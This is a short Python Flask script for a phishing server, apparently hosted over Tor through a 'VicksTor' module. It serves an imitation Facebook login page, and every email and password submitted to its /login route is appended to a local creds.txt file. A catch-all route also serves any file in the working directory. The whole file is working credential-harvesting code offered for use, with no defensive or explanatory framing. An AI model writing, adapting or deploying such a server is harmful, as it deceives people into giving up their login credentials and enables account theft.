
# from HostTor import VicksTor
import VicksTor
VicksTor.run_server('flask')

from flask import (
    Flask, 
    request, 
    render_template, 
    send_from_directory
)
app = Flask(__name__)

def save_creds(email, password):
    with open('creds.txt', 'a') as f:
        f.write(f'''
email : {email}
password : {password}
''')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get("email", False)
    password = request.form.get("password", False)

    # email = request.form['email']
    save_creds(email, password)
    return render_template('Facebook.html')

@app.route('/<path:filename>')  
def send_file(filename):
    return send_from_directory('./', filename)

@app.route('/')
def hello_world():
    return render_template('Facebook.html')

if __name__ == '__main__':
    app.run(debug = False)
